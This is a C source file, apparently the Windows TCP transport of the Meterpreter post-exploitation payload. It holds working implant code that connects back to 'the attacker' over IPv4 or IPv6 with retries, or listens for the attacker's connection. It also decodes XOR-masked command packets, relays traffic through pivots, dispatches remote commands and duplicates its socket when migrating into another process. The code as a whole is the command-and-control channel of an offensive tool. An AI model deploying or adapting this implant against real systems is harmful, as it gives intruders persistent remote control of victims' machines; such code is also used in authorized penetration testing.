/*!
 * @file server_transport_tcp.c
 */
#include "metsrv.h"
#include <ws2tcpip.h>
#include "packet_encryption.h"
#include "pivot_packet_dispatch.h"

// TCP-transport specific migration stub.
typedef struct _TCPMIGRATECONTEXT
{
	COMMONMIGRATECONTEXT common;
	WSAPROTOCOL_INFOA info;
} TCPMIGRATECONTEXT, * LPTCPMIGRATECONTEXT;

// These fields aren't defined unless the SDK version is set to something old enough.
// So we define them here instead of dancing with SDK versions, allowing us to move on
// and still support older versions of Windows.
#ifndef IPPROTO_IPV6
#define IPPROTO_IPV6 41
#endif

/*!
 * @brief Perform the reverse_tcp connect.
 * @param reverseSocket The existing socket that refers to the remote host connection, closed on failure.
 * @param sockAddr The SOCKADDR structure which contains details of the connection.
 * @param sockAddrSize The size of the \c sockAddr structure.
 * @param retryTotal The number of seconds to continually retry for.
 * @param retryWait The number of seconds between each connect attempt.
 * @return Indication of success or failure.
 */
static DWORD reverse_tcp_run(SOCKET reverseSocket, SOCKADDR* sockAddr, int sockAddrSize, DWORD retryTotal, DWORD retryWait)
{
	DWORD result = ERROR_SUCCESS;
	int start = current_unix_timestamp();
	do
	{
		int retryStart = current_unix_timestamp();
		if ((result = connect(reverseSocket, sockAddr, sockAddrSize)) != SOCKET_ERROR)
		{
			break;
		}

		dprintf("[TCP RUN] Connection failed, sleeping for %u s", retryWait);
		sleep(retryWait);
	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < retryTotal);

	if (result == SOCKET_ERROR)
	{
		closesocket(reverseSocket);
	}

	return result;
}

/*!
 * @brief Connects to a provided host/port (IPv4), downloads a payload and executes it.
 * @param host String containing the name or IP of the host to connect to.
 * @param port Port number to connect to.
 * @param retryTotal The number of seconds to continually retry for.
 * @param retryWait The number of seconds between each connect attempt.
 * @return Indication of success or failure.
 */
static DWORD reverse_tcp4(const char* host, u_short port, DWORD retryTotal, DWORD retryWait, SOCKET* socketBuffer)
{
	*socketBuffer = 0;

	// start by attempting to fire up Winsock.
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		return WSAGetLastError();
	}

	// prepare to connect to the attacker
	SOCKET socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct hostent* target = gethostbyname(host);
	char* targetIp = inet_ntoa(*(struct in_addr *)*target->h_addr_list);

	SOCKADDR_IN sock = { 0 };
	sock.sin_addr.s_addr = inet_addr(targetIp);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);

	DWORD result = reverse_tcp_run(socketHandle, (SOCKADDR*)&sock, sizeof(sock), retryTotal, retryWait);

	if (result == ERROR_SUCCESS)
	{
		*socketBuffer = socketHandle;
	}

	return result;
}

/*!
 * @brief Connects to a provided host/port (IPv6), downloads a payload and executes it.
 * @param host String containing the name or IP of the host to connect to.
 * @param service The target service/port.
 * @param scopeId IPv6 scope ID.
 * @param retryTotal The number of seconds to continually retry for.
 * @param retryWait The number of seconds between each connect attempt.
 * @return Indication of success or failure.
 */
static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, DWORD retryTotal, DWORD retryWait, SOCKET* socketBuffer)
{
	*socketBuffer = 0;

	// start by attempting to fire up Winsock.
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		return WSAGetLastError();
	}

	ADDRINFO hints = { 0 };
	hints.ai_family = AF_INET6;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	LPADDRINFO addresses;
	if (getaddrinfo(host, service, &hints, &addresses) != 0)
	{
		return WSAGetLastError();
	}

	// prepare to connect to the attacker
	SOCKET socketHandle = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

	if (socketHandle == INVALID_SOCKET)
	{
		dprintf("[STAGELESS IPV6] failed to connect to attacker");
		return WSAGetLastError();
	}

	DWORD result = ERROR_SUCCESS;
	int start = current_unix_timestamp();
	do
	{
		int retryStart = current_unix_timestamp();
		for (LPADDRINFO address = addresses; address != NULL; address = address->ai_next)
		{
			((LPSOCKADDR_IN6)address->ai_addr)->sin6_scope_id = scopeId;

			if ((result = connect(socketHandle, address->ai_addr, (int)address->ai_addrlen)) != SOCKET_ERROR)
			{
				dprintf("[STAGELESS IPV6] Socket successfully connected");
				*socketBuffer = socketHandle;
				freeaddrinfo(addresses);
				return ERROR_SUCCESS;
			}
		}

		dprintf("[TCP RUN] Connection failed, sleeping for %u s", retryWait);
		sleep(retryWait);
	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < retryTotal);

	closesocket(socketHandle);
	freeaddrinfo(addresses);

	return result;
}

/*!
 * @brief Perform the bind_tcp process.
 * @param listenSocket The existing listen socket that refers to the remote host connection, closed before returning.
 * @param sockAddr The SOCKADDR structure which contains details of the connection.
 * @param sockAddrSize The size of the \c sockAddr structure.
 * @param acceptSocketBuffer Buffer that will receive the accepted socket handle on success.
 * @return Indication of success or failure.
 */
static DWORD bind_tcp_run(SOCKET listenSocket, SOCKADDR* sockAddr, int sockAddrSize, SOCKET* acceptSocketBuffer)
{
	DWORD result = ERROR_SUCCESS;
	do
	{
		if (bind(listenSocket, sockAddr, sockAddrSize) == SOCKET_ERROR)
		{
			result = WSAGetLastError();
			break;
		}

		if (listen(listenSocket, 1) == SOCKET_ERROR)
		{
			result = WSAGetLastError();
			break;
		}

		// Setup, ready to go, now wait for the connection.
		SOCKET acceptSocket = accept(listenSocket, NULL, NULL);

		if (acceptSocket == INVALID_SOCKET)
		{
			result = WSAGetLastError();
			break;
		}

		*acceptSocketBuffer = acceptSocket;
	} while (0);

	closesocket(listenSocket);

	return result;
}

/*!
 * @brief Listens on a port for an incoming payload request.
 * @param port Port number to listen on.
 * @param socketBuffer Pointer to the variable that will recieve the socket file descriptor.
 * @return Indication of success or failure.
 */
static DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
{
	*socketBuffer = 0;

	// start by attempting to fire up Winsock.
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		return WSAGetLastError();
	}

	// prepare a connection listener for the attacker to connect to, and we
	// attempt to bind to both ipv6 and ipv4 by default, and fallback to ipv4
	// only if the process fails.
	BOOL v4Fallback = FALSE;
	SOCKET listenSocket = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

	if (listenSocket == INVALID_SOCKET)
	{
		dprintf("[BIND] Unable to create IPv6 socket");
		v4Fallback = TRUE;
	}
	else
	{
		int no = 0;
		if (setsockopt(listenSocket, IPPROTO_IPV6, IPV6_V6ONLY, (char*)&no, sizeof(no)) == SOCKET_ERROR)
		{
			// fallback to ipv4 - we're probably running on Windows XP or earlier here, which means that to
			// support IPv4 and IPv6 we'd need to create two separate sockets. IPv6 on XP isn't that common
			// so instead, we'll just revert back to v4 and listen on that one address instead.
			dprintf("[BIND] Unable to remove IPV6_ONLY option");
			closesocket(listenSocket);
			v4Fallback = TRUE;
		}
	}

	if (v4Fallback)
	{
		dprintf("[BIND] Falling back to IPV4");
		listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	}

	struct sockaddr_in6 sockAddr = { 0 };

	if (v4Fallback)
	{
		struct sockaddr_in* v4Addr = (struct sockaddr_in*)&sockAddr;
		v4Addr->sin_addr.s_addr = htons(INADDR_ANY);
		v4Addr->sin_family = AF_INET;
		v4Addr->sin_port = htons(port);
	}
	else
	{
		sockAddr.sin6_addr = in6addr_any;
		sockAddr.sin6_family = AF_INET6;
		sockAddr.sin6_port = htons(port);
	}

	return bind_tcp_run(listenSocket, (SOCKADDR*)&sockAddr, v4Fallback ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6), socketBuffer);
}

/*!
 * @brief Poll a socket for data to recv and block when none available.
 * @param remote Pointer to the remote instance.
 * @param timeout Amount of time to wait before the poll times out (in milliseconds).
 * @return Indication of success or failure.
 */
static LONG server_socket_poll(Remote* remote, long timeout)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	struct timeval tv;
	LONG result;
	fd_set fdread;

	lock_acquire(remote->lock);

	FD_ZERO(&fdread);
	FD_SET(ctx->fd, &fdread);

	tv.tv_sec = 0;
	tv.tv_usec = timeout;

	result = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);

	lock_release(remote->lock);

	return result;
}

/*!
 * @brief Receive a new packet on the given remote endpoint.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
 * @return An indication of the result of processing the transmission request.
 */
static DWORD packet_receive(Remote *remote, Packet **packet)
{
	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
	Packet *localPacket = NULL;
	PacketHeader header = { 0 };
	int bytesRead;
	BOOL inHeader = TRUE;
	PUCHAR packetBuffer = NULL;
	ULONG payloadLength;
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;

	lock_acquire(remote->lock);

	dprintf("[TCP PACKET RECEIVE] reading in the header");
	// Read the packet length
	while (inHeader)
	{
		if ((bytesRead = recv(ctx->fd, ((PCHAR)&header + headerBytes), sizeof(PacketHeader)-headerBytes, 0)) <= 0)
		{
			SetLastError(ERROR_NOT_FOUND);
			goto out;
		}

		headerBytes += bytesRead;

		if (headerBytes != sizeof(PacketHeader))
		{
			continue;
		}

		inHeader = FALSE;
	}

	if (headerBytes != sizeof(PacketHeader))
	{
		dprintf("[TCP] we didn't get enough header bytes");
		goto out;
	}

	dprintf("[TCP] the XOR key is: %02x%02x%02x%02x", header.xor_key[0], header.xor_key[1], header.xor_key[2], header.xor_key[3]);

#ifdef DEBUGTRACE
	PUCHAR h = (PUCHAR)&header;
	vdprintf("[TCP] Packet header: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]",
		h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
#endif

	// At this point, we might have read in a valid TLV packet, or we might have read in the first chunk of data
	// from a staged listener after a reconnect. We can figure this out rather lazily by assuming the following:
	// XOR keys are always 4 bytes that are non-zero. If the higher order byte of the xor key is zero, then it
	// isn't an XOR Key, instead it's the 4-byte length of the metsrv binary (because metsrv isn't THAT big).
	if (header.xor_key[3] == 0)
	{
		// looks like we have a metsrv instance, time to ignore it.
		int length = *(int*)&header.xor_key[0];
		dprintf("[TCP] discovered a length header, assuming it's metsrv of length %d", length);

		int bytesToRead = length - sizeof(PacketHeader) + sizeof(DWORD);
		char buffer[65535];

		while (bytesToRead > 0)
		{
			int bytesRead = recv(ctx->fd, buffer, min(sizeof(buffer), bytesToRead), 0);

			if (bytesRead < 0)
			{
				if (GetLastError() == WSAEWOULDBLOCK)
				{
					continue;
				}
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			bytesToRead -= bytesRead;
		}

		// did something go wrong.
		if (bytesToRead > 0)
		{
			goto out;
		}

		// indicate success, but don't return a packet for processing
		SetLastError(ERROR_SUCCESS);
		*packet = NULL;
	}
	else
	{
		vdprintf("[TCP] XOR key looks fine, moving on");
		PacketHeader encodedHeader;
		memcpy(&encodedHeader, &header, sizeof(PacketHeader));
		// xor the header data
		xor_bytes(header.xor_key, (PUCHAR)&header + sizeof(header.xor_key), sizeof(PacketHeader) - sizeof(header.xor_key));
#ifdef DEBUGTRACE
		PUCHAR h = (PUCHAR)&header;
		vdprintf("[TCP] Packet header: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]",
			h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
#endif
		payloadLength = ntohl(header.length) - sizeof(TlvHeader);
		vdprintf("[TCP] Payload length is %d", payloadLength);
		DWORD packetSize = sizeof(PacketHeader) + payloadLength;
		vdprintf("[TCP] total buffer size for the packet is %d", packetSize);
		payloadBytesLeft = payloadLength;

		// Allocate the payload
		if (!(packetBuffer = (PUCHAR)malloc(packetSize)))
		{
			dprintf("[TCP] Failed to create the packet buffer");
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			goto out;
		}
		dprintf("[TCP] Allocated packet buffer at %p", packetBuffer);

		// Copy the packet header stuff over to the packet
		memcpy_s(packetBuffer, sizeof(PacketHeader), (LPBYTE)&encodedHeader, sizeof(PacketHeader));

		LPBYTE payload = packetBuffer + sizeof(PacketHeader);

		// Read the payload
		while (payloadBytesLeft > 0)
		{
			if ((bytesRead = recv(ctx->fd, (PCHAR)(payload + payloadLength - payloadBytesLeft), payloadBytesLeft, 0)) <= 0)
			{

				if (GetLastError() == WSAEWOULDBLOCK)
				{
					continue;
				}

				if (bytesRead < 0)
				{
					SetLastError(ERROR_NOT_FOUND);
				}
				goto out;
			}

			payloadBytesLeft -= bytesRead;
		}

		// Didn't finish?
		if (payloadBytesLeft)
		{
			dprintf("[TCP] Failed to get all the payload bytes");
			goto out;
		}

#ifdef DEBUGTRACE
		h = (PUCHAR)&header.session_guid[0];
		dprintf("[TCP] Packet Session GUID: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
			h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15]);
#endif
		if (is_null_guid(header.session_guid) || memcmp(remote->orig_config->session.session_guid, header.session_guid, sizeof(header.session_guid)) == 0)
		{
			dprintf("[TCP] Session GUIDs match (or packet guid is null), decrypting packet");
			SetLastError(decrypt_packet(remote, packet, packetBuffer, packetSize));
		}
		else
		{
			dprintf("[TCP] Session GUIDs don't match, looking for a pivot");
			PivotContext* pivotCtx = pivot_tree_find(remote->pivot_sessions, header.session_guid);
			if (pivotCtx != NULL)
			{
				dprintf("[TCP] Pivot found, dispatching packet on a thread (to avoid main thread blocking)");
				SetLastError(pivot_packet_dispatch(pivotCtx, packetBuffer, packetSize));

				// mark this packet buffer as NULL as the thread will clean it up
				packetBuffer = NULL;
				*packet = NULL;
			}
			else
			{
				dprintf("[TCP] Session GUIDs don't match, can't find pivot!");
			}
		}
	}

out:
	res = GetLastError();

	dprintf("[TCP] Freeing stuff up");
	SAFE_FREE(packetBuffer);

	// Cleanup on failure
	if (res != ERROR_SUCCESS)
	{
		SAFE_FREE(localPacket);
	}

	lock_release(remote->lock);
	dprintf("[TCP] Packet receive finished");

	return res;
}

/*!
 * @brief The servers main dispatch loop for incoming requests using TCP
 * @param remote Pointer to the remote endpoint for this server connection.
 * @param dispatchThread Pointer to the main dispatch thread.
 * @returns Indication of success or failure.
 */
static DWORD server_dispatch_tcp(Remote* remote, THREAD* dispatchThread)
{
	Transport* transport = remote->transport;
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet * packet = NULL;
	THREAD * cpt = NULL;

	dprintf("[DISPATCH] entering server_dispatch( 0x%08X )", remote);

	int lastPacket = current_unix_timestamp();
	while (running)
	{
		if (event_poll(dispatchThread->sigterm, 0))
		{
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}

		result = server_socket_poll(remote, 50000);
		if (result > 0)
		{
			result = packet_receive(remote, &packet);
			if (result != ERROR_SUCCESS)
			{
				dprintf("[DISPATCH] packet_receive returned %d, exiting dispatcher...", result);
				break;
			}

			if (packet == NULL)
			{
				dprintf("[DISPATCH] No packet received, probably just metsrv being ignored or a pivot packet being handled.");
			}
			else
			{
				running = command_handle(remote, packet);
				dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
			}

			// packet received, reset the timer
			lastPacket = current_unix_timestamp();
		}
		else if (result == 0)
		{
			// check if the communication has timed out, or the session has expired, so we should terminate the session
			int now = current_unix_timestamp();
			if (remote->sess_expiry_end && now > remote->sess_expiry_end)
			{
				result = ERROR_SUCCESS;
				dprintf("[DISPATCH] session has ended");
				break;
			}
			else if ((now - lastPacket) > transport->timeouts.comms)
			{
				result = ERROR_NETWORK_NOT_AVAILABLE;
				dprintf("[DISPATCH] communications has timed out");
				break;
			}
		}
		else
		{
			dprintf("[DISPATCH] server_socket_poll returned %d, exiting dispatcher...", result);
			break;
		}
	}

	dprintf("[DISPATCH] leaving server_dispatch.");

	return result;
}

/*!
 * @brief Get the socket from the transport (if it's TCP).
 * @param transport Pointer to the TCP transport containing the socket.
 * @return The current transport socket FD, if any, or zero.
 */
static UINT_PTR transport_get_handle_tcp(Transport* transport)
{
	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
	{
		return (UINT_PTR)((TcpTransportContext*)transport->ctx)->fd;
	}

	return 0;
}

/*!
 * @brief Set the socket from the transport (if it's TCP).
 * @param transport Pointer to the TCP transport containing the socket.
 * @param handle The current transport socket FD, if any.
 */
static void transport_set_handle_tcp(Transport* transport, UINT_PTR handle)
{
	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
	{
		((TcpTransportContext*)transport->ctx)->fd = (SOCKET)handle;
	}
}

/*!
 * @brief Destroy the TCP transport.
 * @param transport Pointer to the TCP transport to destroy.
 */
static void transport_destroy_tcp(Transport* transport)
{
	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
	{
		dprintf("[TRANS TCP] Destroying tcp transport for url %S", transport->url);
		SAFE_FREE(transport->url);
		SAFE_FREE(transport->ctx);
		SAFE_FREE(transport);
	}
}

/*!
 * @brief Handle cleaning up on the client socket when MSF terminates the connection.
 * @param thread Pointer to the thread instance.
 * @return EXIT_SUCCESS
 */
DWORD THREADCALL cleanup_socket(THREAD* thread)
{
	char buf[4];
	int result;
	SOCKET fd = (SOCKET)thread->parameter1;

	dprintf("[TCP] waiting for disconnect from remote");
	// loop until FD_CLOSE comes through.
	while ((result = recv(fd, buf, sizeof(buf), 0)) != 0)
	{
		if (result <= 0)
		{
			break;
		}
	}

	dprintf("[TCP] disconnect received, cleaning up");
	closesocket(fd);
	thread_destroy(thread);

	return EXIT_SUCCESS;
}

/*!
 * @brief Reset the given TCP connection.
 * @param transport Pointer to the TCP transport to reset.
 * @param shuttingDown Indication that the Metsrv instance is terminating completely.
 */
static void transport_reset_tcp(Transport* transport, BOOL shuttingDown)
{
	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
	{
		TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
		dprintf("[TCP] Resetting transport from %u", ctx->fd);
		if (ctx->fd)
		{
			if (shuttingDown)
			{
				dprintf("[TCP] Transport is shutting down");
				// we can terminate right here, given that we're closing up
				closesocket(ctx->fd);
			}
			else
			{
				// Thanks to the fact that we know we can't rely on Windows to flush the socket nicely
				// we can't just call "closesocket" on the socket. If we do, we could lose packets that
				// cause MSF to be rather unhappy (and it hangs as a result of not getting a response).
				// Instead of this, we create a new thread which monitors the socket handle. We know that
				// MSF will terminate that connection when resetting, and so we wait for that termination
				// before cleaning up the socket. This is done in another thread so that functionality
				// can continue.
				dprintf("[TCP] It should now be safe to close the socket.");
				THREAD* t = thread_create(cleanup_socket, (LPVOID)ctx->fd, NULL, NULL);
				thread_run(t);
			}
		}
		ctx->fd = 0;
		dprintf("[TCP] Transport 0x%p is now reset to %u", transport, ctx->fd);
	}
}

/*!
 * @brief Configure the TCP connnection. If it doesn't exist, go ahead and estbalish it.
 * @param transport Pointer to the transport instance.
 * @return Indication of success or failure.
 */
static DWORD configure_tcp_connection(Transport* transport)
{
	DWORD result = ERROR_SUCCESS;
	size_t charsConverted;
	char asciiUrl[512];
	TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;

	// check if comms is already open via a staged payload
	if (ctx->fd)
	{
		dprintf("[TCP] Connection already running on %u", ctx->fd);
	}
	else
	{
		// From here, we need to establish comms a-la stageless.
		wcstombs_s(&charsConverted, asciiUrl, sizeof(asciiUrl), transport->url, sizeof(asciiUrl)-1);

		dprintf("[TCP CONFIGURE] Url: %S", transport->url);

		//transport->start_time = current_unix_timestamp();
		transport->comms_last_packet = current_unix_timestamp();

		if (strncmp(asciiUrl, "tcp", 3) == 0)
		{
			char* pHost = strstr(asciiUrl, "//") + 2;
			char* pPort = strrchr(pHost, ':') + 1;

			// check if we're using IPv6
			if (asciiUrl[3] == '6')
			{
				char* pScopeId = strrchr(pHost, '?') + 1;
				*(pScopeId - 1) = '\0';
				*(pPort - 1) = '\0';
				dprintf("[STAGELESS] IPv6 host %s port %S scopeid %S", pHost, pPort, pScopeId);
				result = reverse_tcp6(pHost, pPort, atol(pScopeId), transport->timeouts.retry_total,
					transport->timeouts.retry_wait, &ctx->fd);
			}
			else
			{
				u_short usPort = (u_short)atoi(pPort);

				// if no host is specified, then we can assume that this is a bind payload, otherwise
				// we'll assume that the payload is a reverse_tcp one and the given host is valid
				if (*pHost == ':')
				{
					dprintf("[STAGELESS] IPv4 bind port %s", pPort);
					result = bind_tcp(usPort, &ctx->fd);
				}
				else
				{
					*(pPort - 1) = '\0';
					dprintf("[STAGELESS] IPv4 host %s port %s", pHost, pPort);
					result = reverse_tcp4(pHost, usPort, transport->timeouts.retry_total,
						transport->timeouts.retry_wait, &ctx->fd);
				}
			}
		}
	}

	if (result != ERROR_SUCCESS)
	{
		dprintf("[SERVER] Something went wrong %u", result);
	}
  else
  {
		dprintf("[SERVER] Looking good, FORWARD!");

		// Do not allow the file descriptor to be inherited by child processes
		SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);

		transport->comms_last_packet = current_unix_timestamp();
	}

	return result;
}

/*!
 * @brief Transmit a packet via TCP.
 * @param remote Pointer to the \c Remote instance.
 * @param rawPacket Pointer to the raw packet bytes to send.
 * @param rawPacketLength Length of the raw packet data.
 * @return An indication of the result of processing the transmission request.
 */
DWORD packet_transmit_tcp(Remote* remote, LPBYTE rawPacket, DWORD rawPacketLength)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	DWORD result = ERROR_SUCCESS;
	DWORD idx = 0;

	lock_acquire(remote->lock);

	while (idx < rawPacketLength)
	{
		result = send(ctx->fd, (PCHAR)(rawPacket + idx), rawPacketLength - idx, 0);

		if (result < 0)
		{
			dprintf("[PACKET] send failed: %d", result);
			break;
		}

		idx += result;
	}

	result = GetLastError();

	if (result != ERROR_SUCCESS)
	{
		dprintf("[PACKET] transmit packet failed with return %d at index %d\n", result, idx);
	}
	else
	{
		dprintf("[PACKET] Packet sent!");
	}

	lock_release(remote->lock);

	return result;
}

/*!
 * @brief Create a configuration block from the given transport.
 * @param transport Transport data to create the configuration from.
 * @return config Pointer to the config block to write to.
 */
void transport_write_tcp_config(Transport* transport, MetsrvTransportTcp* config)
{
	if (transport && config)
	{
		config->common.comms_timeout = transport->timeouts.comms;
		config->common.retry_total = transport->timeouts.retry_total;
		config->common.retry_wait = transport->timeouts.retry_wait;
		wcsncpy(config->common.url, transport->url, URL_SIZE);
	}
}

/*!
 * @brief Create a migration context that is specific to this transport type.
 * @param transport Transport data to create the configuration from.
 * @param targetProcessId ID of the process that we will be migrating into.
 * @param targetProcessHandle Handle to the target process.
 * @param contextSize Buffer that will receive the size of the generated context.
 * @param contextBufer Buffer that will receive the generated context.
 * @return Indication of success or failure.
 */
static DWORD get_migrate_context_tcp(Transport* transport, DWORD targetProcessId, HANDLE targetProcessHandle, LPDWORD contextSize, LPBYTE* contextBuffer)
{
	LPTCPMIGRATECONTEXT ctx = (LPTCPMIGRATECONTEXT)calloc(1, sizeof(TCPMIGRATECONTEXT));

	if (ctx == NULL)
	{
		return ERROR_OUTOFMEMORY;
	}

	// Duplicate the socket for the target process
	if (WSADuplicateSocketA(((TcpTransportContext*)transport->ctx)->fd, targetProcessId, &ctx->info) != NO_ERROR)
	{
		free(ctx);
		return WSAGetLastError();
	}

	*contextSize = sizeof(TCPMIGRATECONTEXT);
	*contextBuffer = (PBYTE)ctx;

	return ERROR_SUCCESS;
}

/*!
 * @brief Gets the size of the memory space required to store the configuration for this transport.
 * @param t Pointer to the transport.
 * @return Size, in bytes of the required memory block.
 */
static DWORD transport_get_config_size_tcp(Transport* t)
{
	return sizeof(MetsrvTransportTcp);
}

/*!
 * @brief Creates a new TCP transport instance.
 * @param config The TCP configuration block.
 * @param size Pointer to the size of the parsed config block.
 * @return Pointer to the newly configured/created TCP transport instance.
 */
Transport* transport_create_tcp(MetsrvTransportTcp* config, LPDWORD size)
{
	Transport* transport = (Transport*)malloc(sizeof(Transport));
	TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));

	if (size)
	{
		*size = sizeof(MetsrvTransportTcp);
	}

	dprintf("[TRANS TCP] Creating tcp transport for url %S", config->common.url);

	memset(transport, 0, sizeof(Transport));
	memset(ctx, 0, sizeof(TcpTransportContext));

	transport->type = METERPRETER_TRANSPORT_TCP;
	transport->timeouts.comms = config->common.comms_timeout;
	transport->timeouts.retry_total = config->common.retry_total;
	transport->timeouts.retry_wait = config->common.retry_wait;
	transport->url = _wcsdup(config->common.url);
	transport->packet_transmit = packet_transmit_tcp;
	transport->transport_init = configure_tcp_connection;
	transport->transport_destroy = transport_destroy_tcp;
	transport->transport_reset = transport_reset_tcp;
	transport->server_dispatch = server_dispatch_tcp;
	transport->get_handle = transport_get_handle_tcp;
	transport->set_handle = transport_set_handle_tcp;
	transport->ctx = ctx;
	transport->comms_last_packet = current_unix_timestamp();
	transport->get_migrate_context = get_migrate_context_tcp;
	transport->get_config_size = transport_get_config_size_tcp;

	return transport;
}

